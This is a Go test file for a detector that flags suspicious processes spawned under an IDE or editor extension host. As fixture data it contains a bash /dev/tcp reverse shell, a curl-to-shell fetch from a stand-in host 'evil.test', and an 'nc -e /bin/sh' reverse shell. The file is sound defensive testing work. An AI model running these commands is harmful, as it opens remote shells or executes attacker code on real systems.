package behavior

import "testing"

func TestDetectSuspicious_ReverseShellUnderIDE(t *testing.T) {
	procs := []Process{
		{PID: 1, PPID: 0, Comm: "launchd", Args: "/sbin/launchd"},
		{PID: 100, PPID: 1, Comm: "Code Helper", Args: "Code Helper --type=extensionHost"},
		{PID: 200, PPID: 100, Comm: "bash", Args: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
	}
	f := DetectSuspicious(procs)
	if len(f) != 1 {
		t.Fatalf("expected 1 finding, got %d: %+v", len(f), f)
	}
	if f[0].PID != 200 || f[0].AncestorPID != 100 {
		t.Errorf("unexpected finding: %+v", f[0])
	}
}

func TestDetectSuspicious_PipeToShellUnderExtension(t *testing.T) {
	procs := []Process{
		{PID: 1, PPID: 0, Comm: "init", Args: "init"},
		{PID: 50, PPID: 1, Comm: "node", Args: "node /home/u/.vscode/extensions/evil/out/main.js"},
		{PID: 60, PPID: 50, Comm: "sh", Args: "curl http://evil.test/x | sh"},
	}
	f := DetectSuspicious(procs)
	if len(f) != 1 || f[0].PID != 60 {
		t.Fatalf("expected pipe-to-shell finding under extension, got %+v", f)
	}
}

func TestDetectSuspicious_NormalProcessesClean(t *testing.T) {
	procs := []Process{
		{PID: 1, PPID: 0, Comm: "launchd", Args: "/sbin/launchd"},
		{PID: 100, PPID: 1, Comm: "Code Helper", Args: "Code Helper --type=extensionHost"},
		{PID: 200, PPID: 100, Comm: "node", Args: "node tsserver.js"},
		{PID: 300, PPID: 1, Comm: "bash", Args: "bash -i"}, // suspicious but NOT under an IDE
	}
	if f := DetectSuspicious(procs); len(f) != 0 {
		t.Errorf("expected no findings, got %+v", f)
	}
}

func TestDetectSuspicious_SuspiciousButNoIDEAncestor(t *testing.T) {
	procs := []Process{
		{PID: 1, PPID: 0, Comm: "sshd", Args: "sshd"},
		{PID: 10, PPID: 1, Comm: "bash", Args: "nc -e /bin/sh 10.0.0.1 9001"},
	}
	if f := DetectSuspicious(procs); len(f) != 0 {
		t.Errorf("reverse shell not under an IDE should not be flagged by this spike, got %+v", f)
	}
}

func TestParsePS(t *testing.T) {
	out := "  1     0 launchd /sbin/launchd\n100   1 node node main.js\nbadline\n"
	procs := parsePS(out)
	if len(procs) != 2 {
		t.Fatalf("expected 2 parsed processes, got %d: %+v", len(procs), procs)
	}
	if procs[0].PID != 1 || procs[1].PPID != 1 {
		t.Errorf("parse mismatch: %+v", procs)
	}
}
